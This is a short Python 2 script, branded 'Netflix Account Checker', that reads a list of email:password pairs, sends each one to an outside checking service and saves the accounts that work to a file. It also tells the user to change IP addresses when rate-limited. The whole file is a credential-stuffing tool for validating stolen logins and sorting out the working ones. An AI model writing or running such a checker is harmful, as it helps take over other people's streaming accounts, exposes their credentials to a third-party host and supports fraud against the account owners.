#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
C0 = "\033[0;36m"
C1 = "\033[1;36m"
G0 = "\033[0;32m"
G1 = "\033[1;32m"
W0 = "\033[0;37m"
W1 = "\033[1;37m"
R0 = "\033[0;31m"
R1 = "\033[1;31m"
try:	import requests, sys, os, json
except:	os.system('pip2 install requests')

try:
	os.system('clear')
	print '''%s
   _  __    __  ______
  / |/ /__ / /_/ _/ (_)_ __    %sCoded by D4RKSH4D0WS%s
 /    / -_) __/ _/ / /\ \ /    %sNetflix Account Checker%s
/_/|_/\__/\__/_//_/_//_\_\     %swa.me/628996604524

'''%(C1,W0,C1,W0,C1,W0)
	for akun in open(sys.argv[1]).read().splitlines():
		api=requests.post('https://checkers.run/nf-free/check-account',data={'account':akun}).text
		js=json.loads(api)
		if js['limit'] == True:
			exit('%s[ %sLIMIT %s] Change your IP'%(W0,R0,W0))
		elif js['screens'] == '-':
			print '%s[ %sNot working %s] %s'%(W0,R0,W0,akun)
		else:
			print '%s[ %sWorking %s] %s'%(W0,G0,W0,akun)
			print '%s[ %sScreens %s] %s'%(W0,G0,W0,js['screens'])
			print '%s[ %sLanguage%s] %s'%(W0,G0,W0,js['language'])
			print '%s[ %s Valid  %s] %s'%(W0,G0,W0,js['until'])
			open('working.txt','a+').write(akun+'\n')
			print
	print
	print '%s[ %sDONE %s] Saved in working.txt'%(W0,G0,W0)
except requests.exceptions.ConnectionError:
	exit('%s[%s!%s] %sCheck internet'%(W1,R1,W1,W0))
except IndexError:
	exit('%s[%s!%s] %sUse : python2 %s target.txt \n%s[%s!%s] %sFill in target.txt as follows user@email.com:password'%(W1,R1,W1,W0,sys.argv[0],W1,R1,W1,W0))
except IOError:
	exit('%s[%s!%s] %sFile does not exist'%(W1,R1,W1,W0))
except KeyboardInterrupt:
	exit('\n%s[%s!%s] %sExit'%(W1,R1,W1,W0))
